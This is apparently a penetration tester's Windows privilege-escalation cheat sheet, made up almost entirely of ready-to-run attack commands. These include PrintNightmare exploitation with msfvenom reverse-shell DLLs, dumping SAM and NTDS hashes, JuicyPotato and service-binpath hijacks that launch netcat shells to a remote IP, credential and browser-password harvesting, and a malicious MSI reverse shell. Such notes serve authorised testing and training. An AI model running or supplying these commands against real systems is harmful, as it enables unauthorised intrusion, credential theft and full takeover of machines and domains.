# Windows

## **Enumerating OS Version and Architecture**

```
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

## Unpatched Software

```
wmic product get name,version,vendor
```

## PrintNightmare (CVE-2021-1675)

{% embed url="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html" %}

{% embed url="https://fahmifj.github.io/blog/testing-printnightmare-on-hackthebox/" %}

{% embed url="https://github.com/cube0x0/CVE-2021-1675" %}

We can use `rpcdump.py` from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable

```
rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

#### Install their version of Impacket

```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

#### Create a malicious .dll&#x20;

{% code overflow="wrap" %}
```python
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f dll > shell.dll
```
{% endcode %}

#### Host a smbserver

```
impacket-smbserver share . -smb2support
```

{% code overflow="wrap" %}
```python
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'

./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
```
{% endcode %}

{% embed url="https://github.com/calebstewart/CVE-2021-1675" %}

```powershell
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default

Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure" 
```

## SeBackupPrivilege

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" %}

#### Method 1

#### Standalone Windows Box

```
# on victim
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system

download sam
download system

# on kali
pypykatz registry --sam sam system
impacket-secretsdump -sam sam -system system LOCAL
```

#### Domain Controller

This privilege only allows you to make backups not copies

```
# on kali
nano pwn.dsh
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
unix2dos pwn.dsh

# on victim
cd C:\Temp
upload pwn.dsh
diskshadow /s pwn.dsh
robocopy /b z:\windows\ntds . ntds.dit

reg save hklm\system c:\Temp\system
cd C:\Temp
download ntds.dit
download system

# on kali
impacket-secretsdump -ntds ntds.dit -system system local
```

#### Method 2

{% embed url="https://github.com/giuliano108/SeBackupPrivilege" %}

```
# on kali
nano pwn.dsh
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
unix2dos pwn.dsh

# on victim
cd C:\Temp
upload pwn.dsh
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
diskshadow /s pwn.dsh

Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
reg save hklm\system c:\Temp\system
cd C:\Temp
download ntds.dit
download system

# on kali
impacket-secretsdump -ntds ntds.dit -system system local
```

## SeImpersonateToken

SeImpersonateToken or SeAssignPrimaryToken - Enabled

### Exploiting with Juicy Potato

[http://ohpe.it/juicy-potato/\
http://ohpe.it/juicy-potato/CLSID\
https://github.com/ivanitlearning/Juicy-Potato-x86/releases](http://ohpe.it/juicy-potato/http://ohpe.it/juicy-potato/CLSIDhttps:/github.com/ivanitlearning/Juicy-Potato-x86/releases)

We need to specify CLSID value with systeminfo. It changes with Windows versions.

```
LocalService CLSID
BITS	{4991d34b-80a1-4291-83b6-3328366b9097}	NT AUTHORITY\SYSTEM

Checking...
JuicyPotatox86.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
[+] CreateProcessWithTokenW OK

JuicyPotatox86.exe -l 1337 -p C:\windows\temp\nc.exe -a "-e cmd 192.168.1.1 80" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

### Exploiting with PrintSpoofer.exe

The target machine's arch is need to be x64.

[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

```
PrintSpoofer.exe -i -c cmd
\\192.168.1.1\Share\PrintSpoofer.exe -i -c cmd
```

## Services

Get a list of services:

```
net start
wmic service list brief
sc query
Get-Service
```

### Permissions

You can use **sc** to get information of a service

```
sc qc <service_name>
```

It is recommended to have the binary **accesschk** from _Sysinternals_ to check the required privilege level for each service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

It is recommended to check if "Authenticated Users" can modify any service:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk64.exe -qlc "someUser" *
```

[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Enable service

If you are having this error (for example with SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

You can enable it using

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Take into account that the service upnphost depends on SSDPSRV to work (for XP SP1)**

**Another workaround** of this problem is running:

```
sc.exe config usosvc start= auto
```

### **Modify service binary path**

If the group "Authenticated users" has **SERVICE\_ALL\_ACCESS** in a service, then it can modify the binary that is being executed by the service. To modify it and execute **nc** you can do:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Restart service

```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Other Permissions can be used to escalate privileges:\
**SERVICE\_CHANGE\_CONFIG** Can reconfigure the service binary\
**WRITE\_DAC:** Can reconfigure permissions, leading to SERVICE\_CHANGE\_CONFIG\
**WRITE\_OWNER:** Can become owner, reconfigure permissions\
**GENERIC\_WRITE:** Inherits SERVICE\_CHANGE\_CONFIG\
**GENERIC\_ALL:** Inherits SERVICE\_CHANGE\_CONFIG

**To detect and exploit** this vulnerability you can use _exploit/windows/local/service\_permissions_

### Services binaries weak permissions

**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](broken-reference))**.**\
You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

You can also use **sc** and **icacls**:

```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

### Services registry modify permissions

You should check if you can modify any service registry.\
You can **check** your **permissions** over a service **registry** doing:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Check if **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** have FullControl. In that case you can change the binary that is going to be executed by the service.

To change the Path of the binary executed:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new
```

### Unquoted Service Path

{% embed url="https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths" %}

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:

```
C:\Program.exe 
C:\Program Files\Some.exe 
C:\Program Files\Some Folder\Service.exe
```

To list all unquoted service paths (minus built-in Windows services)

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

**You can detect and exploit** this vulnerability with metasploit: _exploit/windows/local/trusted\_service\_path_\
You can manually create a service binary with metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

## Windows Credentials

### Winlogon Credentials

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

### Saved Creds

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

```
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

```
runas /savecred /user:admin C:\temp\reverse.exe
runas /savecred /user:admin cmd.exe
```

The following example is calling a remote binary via an SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Using `runas` with a provided set of credential.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

### PowerShell Credentials

**PowerShell credentials** are often used for **scripting** and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using **DPAPI**, which typically means they can only be decrypted by the same user on the same computer they were created on.

To **decrypt** a PS credentials from the file containing it you can do:

```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

## Files and Registry (Credentials)

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys in registry

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` so you should check if there is anything interesting in there:

```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```

If you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
More information about this technique here: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Unattended Windows Installations

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\system32\sysprep.inf
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\Windows\system32\sysprep\sysprep.xml
C:\Unattend.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

### SAM & SYSTEM backups

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

### Cached GPP Pasword

Before KB2928120 (see MS14-025), some Group Policy Preferences could be configured with a custom account. This feature was mainly used to deploy a custom local administrator account on a group of machines. There were two problems with this approach though. First, since the Group Policy Objects are stored as XML files in SYSVOL, any domain user can read them. The second problem is that the password set in these GPPs is AES256-encrypted with a default key, which is publicly documented. This means that any authenticated user could potentially access very sensitive data and elevate their privileges on their machine or even the domain. This function will check whether any locally cached GPP file contains a non-empty "cpassword" field. If so, it will decrypt it and return a custom PS object containing some information about the GPP along with the location of the file.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**To decrypt the cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Using crackmapexec to get the passwords:

```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Configuration

```bash
# Here is a quick way to find database connection strings on the file:
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString


Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

### Logs

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### **Possible filenames containing credentials**

Known files that some time ago contained **passwords** in **clear-text** or **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Search all of the proposed files:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where
```

### Inside the registry

**Other possible registry keys with credentials**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

You should check for dbs where passwords from **Chrome or Firefox** are stored.\
Also check for the history, bookmarks and favourites of the browsers so maybe some **passwords are** stored there.

Tools to extract passwords from browsers:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)\*\*\*\*

### **Generic Password search in files and registry**

**Search for file contents**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Search for a file with a certain filename**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Search the registry for key names and passwords**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Powershell History

### PowerShell History

{% code title="in cmd.exe" %}
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
{% endcode %}

{% code title="in powershell" %}
```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
{% endcode %}

## Scheduled Tasks

```
schtasks /query /tn vulntask /fo list /v
```

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Generate the malicious file

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
